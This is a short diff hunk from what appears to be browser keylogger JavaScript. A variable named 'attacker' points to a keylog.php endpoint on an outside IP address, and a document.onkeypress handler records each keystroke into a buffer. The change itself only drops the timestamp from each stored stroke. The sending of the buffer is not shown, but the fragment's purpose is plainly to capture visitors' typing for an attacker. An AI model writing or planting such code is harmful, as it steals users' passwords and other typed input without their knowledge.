@@ -3,10 +3,7 @@ var attacker = 'http://91.142.94.69/keylog.php?c='
 
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
-    var stroke = {
-        k: e.key,
-        t: timestamp
-    };
+    var stroke = e.key;
     buffer.push(stroke);
 }
 
